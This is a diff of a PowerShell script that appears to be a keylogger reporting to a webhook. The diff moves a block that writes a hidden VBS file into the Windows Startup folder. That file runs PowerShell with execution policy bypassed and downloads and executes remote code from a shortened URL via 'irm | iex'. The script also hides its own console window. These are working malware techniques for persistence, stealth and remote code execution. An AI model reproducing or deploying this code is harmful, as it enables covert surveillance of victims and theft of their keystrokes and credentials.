@@ -1,16 +1,10 @@
 # shortened URL Detection
+
 if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
 
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
-$vbs = @'
-Set WshShell = WScript.CreateObject("WScript.Shell")
-WScript.Sleep 200
-WshShell.Run "powershell.exe -NoP -Ep Bypass -W H -C $dc='https://t.ly/exQMG'; irm https://is.gd/bw_kl_to_dc | iex", 0, True
-'@
-$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-$vbs | Out-File -FilePath $pth -Force
 if($hwnd -ne [System.IntPtr]::Zero){
     $Type::ShowWindowAsync($hwnd, 0)
 }
@@ -20,6 +14,14 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
+
+$vbs = @'
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WScript.Sleep 200
+WshShell.Run "powershell.exe -NoP -Ep Bypass -W H -C $dc='https://t.ly/exQMG'; irm https://is.gd/bw_kl_to_dc | iex", 0, True
+'@
+$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+$vbs | Out-File -FilePath $pth -Force
 
 # Import DLL Definitions for keyboard inputs
 $API = @'
